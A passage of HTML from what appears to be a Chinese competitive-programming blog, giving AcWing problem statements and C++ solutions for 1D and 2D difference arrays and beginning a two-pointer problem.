class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], b[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">  b[l] += c;</span><br><span class="line">  b[r + <span class="number">1</span>] -= c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="built_in">insert</span>(i, i, a[i]);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> l, r, c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;c);</span><br><span class="line">    <span class="built_in">insert</span>(l, r, c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    b[i] += b[i - <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-798-差分矩阵"><a href="https://www.acwing.com/problem/content/800/">AcWing 798. 差分矩阵</a></h2><p>输入一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 列的整数矩阵，再输入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> 个操作，每个操作包含五个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">x_1, y_1, x_2, y_2, c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_1, y_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_2, y_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 表示一个子矩阵的左上角坐标和右下角坐标。</p><p>每个操作都要将选中的子矩阵中的每个元素的值加上 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span>。</p><p>请你将进行完所有操作后的矩阵输出。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo separator="true">,</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">n,m,q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 行，每行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 个整数，表示整数矩阵。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> 行，每行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> 个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">x_1, y_1, x_2, y_2, c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span></span></span></span>，表示一个操作。</p><p><strong>输出格式</strong></p><p>共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 行，每行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 个整数，表示所有操作进行完毕后的最终矩阵。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n,m \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>q</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le q \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><msub><mi>x</mi><mn>1</mn></msub><mo>≤</mo><msub><mi>x</mi><mn>2</mn></msub><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \le x_1 \le x_2 \le n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><msub><mi>y</mi><mn>1</mn></msub><mo>≤</mo><msub><mi>y</mi><mn>2</mn></msub><mo>≤</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">1 \le y_1 \le y_2 \le m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1000</mn><mo>≤</mo><mi>c</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le c \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1000</mn><mo>≤</mo><mtext>矩阵内元素的值</mtext><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le 矩阵内元素的值 \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">矩阵内元素的值</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>3 4 31 2 2 13 2 2 11 1 1 11 1 2 2 11 3 2 3 23 1 3 4 1</code></pre><p><strong>输出样例：</strong></p><pre><code>2 3 4 14 3 4 12 2 2 2</code></pre><h3 id="二维差分">二维差分</h3><blockquote><p>如果要将二维数组作为参数传递，写法为 <code>void insert(int (*b)[N], int x1, int y1, int x2, int y2, int c) </code><br>二维数组的传法:第二维的大小必须传递。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> a[kN][kN], b[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> x1, <span class="type">int</span> y1, <span class="type">int</span> x2, <span class="type">int</span> y2, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">  b[x1][y1] += c;</span><br><span class="line">  b[x2 + <span class="number">1</span>][y1] -= c;</span><br><span class="line">  b[x1][y2 + <span class="number">1</span>] -= c;</span><br><span class="line">  b[x2 + <span class="number">1</span>][y2 + <span class="number">1</span>] += c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m, q;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line">      <span class="built_in">insert</span>(i, j, i, j, a[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">    <span class="type">int</span> x1, y1, x2, y2, c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d%d&quot;</span>, &amp;x1, &amp;y1, &amp;x2, &amp;y2, &amp;c);</span><br><span class="line">    <span class="built_in">insert</span>(x1, y1, x2, y2, c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      b[i][j] += b[i - <span class="number">1</span>][j] + b[i][j - <span class="number">1</span>] - b[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="双指针算法">双指针算法</h1><h2 id="AcWing-799-最长连续不重复子序列"><a href="https://www.acwing.com/problem/content/801/">AcWing 799. 最长连续不重复子序列</a></h2><p>给定一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的整数序列，请找出最长的不包含重复的数的连续区间，输出它的长度。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数（均在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">0 \sim 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span 